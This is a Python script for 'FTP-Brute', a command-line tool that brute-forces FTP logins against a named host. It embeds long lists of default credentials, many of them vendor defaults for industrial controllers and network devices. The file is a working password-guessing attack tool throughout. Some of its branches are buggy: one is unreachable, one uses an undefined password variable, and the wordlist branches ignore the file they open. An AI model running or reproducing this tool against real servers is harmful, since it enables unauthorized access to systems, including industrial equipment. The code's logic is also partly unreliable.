import ftplib
import argparse
from colorama import Fore, Style
import sys

version = "v1.0.2"

logo = r"""
    ________________        ____             __     
   / ____/_  __/ __ \      / __ )_______  __/ /____ 
  / /_    / / / /_/ /_____/ __  / ___/ / / / __/ _ \
 / __/   / / / ____/_____/ /_/ / /  / /_/ / /_/  __/
/_/     /_/ /_/         /_____/_/   \__,_/\__/\___/ 
                                                    
"""

ftpserver = ftplib.FTP()

parser = argparse.ArgumentParser(prog='ftpBrute',
                                 description='Bruteforce FTP with wordlists or common built-in usernames/passwords',
                                 epilog=f'{version}')

parser.add_argument('--host', help='Specify the target FTP server hostname (e.g., `192.168.1.1`).', type=str, required=True)
parser.add_argument('--port', help='Specify the FTP port (default is `21`).', type=int, required=True)

parser.add_argument('-u', '--username', help='Provide a custom username for the brute-force attack.', type=str)
parser.add_argument('-p', '--password', help='Provide a custom password for the brute-force attack.', type=str)

parser.add_argument('-w', '--wordlist', help='Provide a wordlist file to attempt brute-forcing usernames (one per line).', type=str)

args = parser.parse_args()

if not args.host:
    parser.print_help()


usernames = [
    "anonymous",
    "root",
    "root",
    "ftp",
    "admin",
    "localadmin",
    "admin",
    "apc",
    "admin",
    "Root",
    "Admin",
    "User",
    "Guest",
    "ftp",
    "admin",
    "a",
    "admin",
    "adtec",
    "admin",
    "none",
    "instrument",
    "user",
    "root",
    "default",
    "admin",
    "nmt",
    "admin",
    "supervisor",
    "user1",
    "avery",
    "IEIeMerge",
    "ADMIN",
    "beijer",
    "Admin",
    "admin",
    "admin",
    "root",
    "se",
    "admin",
    "device",
    "apc",
    "apc",
    "dm",
    "dmftp",
    "httpadmin",
    "user",
    "MELSEC",
    "QNUDECPU",
    "ftp_boot",
    "uploader",
    "ftpuser",
    "USER",
    "qbf77101",
    "ntpupdate",
    "sysdiag",
    "wsupgrade",
    "pcfactory",
    "loader",
    "test",
    "webserver",
    "fdrusers",
    "nic2212",
    "user",
    "su",
    "MayGion",
    "admin",
    "PlcmSpIp"
]

passwords = [
    "anonymous",
    "rootpasswd",
    "12hrs37",
    "b1uRR3",
    "admin",
    "localadmin",
    "1234",
    "apc",
    "nas",
    "wago",
    "wago",
    "user",
    "guest",
    "ftp",
    "password",
    "avery",
    "123456",
    "none",
    "admin12345",
    "dpstelecom",
    "instrument",
    "password",
    "password",
    "default",
    "default",
    "Janitza",
    "supervisor",
    "pass1",
    "avery",
    "eMerge",
    "12345",
    "beijer",
    "admin",
    "1234",
    "1111",
    "admin",
    "1234",
    "stingray",
    "apc",
    "apc",
    "ftp",
    "ftp",
    "fhttpadmin",
    "system",
    "MELSEC",
    "QNUDECPU",
    "ftp_boot",
    "ZYPCOM",
    "password",
    "USER",
    "hexakisoctahedron",
    "ntpupdate",
    "factorycast@schneider",
    "wsupgrade",
    "pcfactory",
    "fwdownload",
    "testingpw",
    "webpages",
    "sresurdf",
    "poiuypoiuy",
    "user00",
    "ko2003wa",
    "maygion.com",
    "9999",
    "PlcmSpIp"
]


def bruteforce():
    try:
        print(f"{Fore.RED}{logo}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.RED}{args.host}{Style.RESET_ALL}:{Fore.RED}{args.port}{Style.RESET_ALL}]")
        #bruteforce with given values
        if args.username and args.password:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
            try:
                ftpserver.connect(args.host, args.port)
                ftpserver.login(args.username, args.password)
                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
            except ftplib.all_errors as e:
                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.username:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN}[{args.username}]{Style.RESET_ALL}")
            for pwd in passwords:
                try:
                    ftpserver.connect(args.host, args.port)
                    ftpserver.login(args.username, pwd)
                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                except ftplib.all_errors as e:
                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.password:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN} [{args.password}] {Style.RESET_ALL}")
            for user in usernames:
                try:
                    ftpserver.connect(args.host, args.port)
                    ftpserver.login(user, args.password)
                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                except ftplib.all_errors as e:
                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        else:
            #bruteforcing with buildin list
            for user in usernames:
                for pwd in passwords:
                    print(f"{Fore.YELLOW}Bruteforcing with buildin credentials: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(user, pwd)
                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                        break
                    except ftplib.all_errors as e:
                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
                        continue

        if args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    wordlist = file.readlines()
                    for user in wordlist:
                        user = user.strip()
                        for pwd in passwords:
                            print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                            try:
                                ftpserver.connect(args.host, args.port)
                                ftpserver.login(user, pwd)
                                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                                break
                            except ftplib.all_errors as e:
                                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.username and args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    for pwd in passwords:
                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                        try:
                            ftpserver.connect(args.host, args.port)
                            ftpserver.login(args.username, pwd)
                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                            break
                        except ftplib.all_errors as e:
                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.password and args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    for user in usernames:
                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                        try:
                            ftpserver.connect(args.host, args.port)
                            ftpserver.login(user, pwd)
                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                            break
                        except ftplib.all_errors as e:
                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}Bye!{Style.RESET_ALL}")
        sys.exit(0)  
bruteforce()
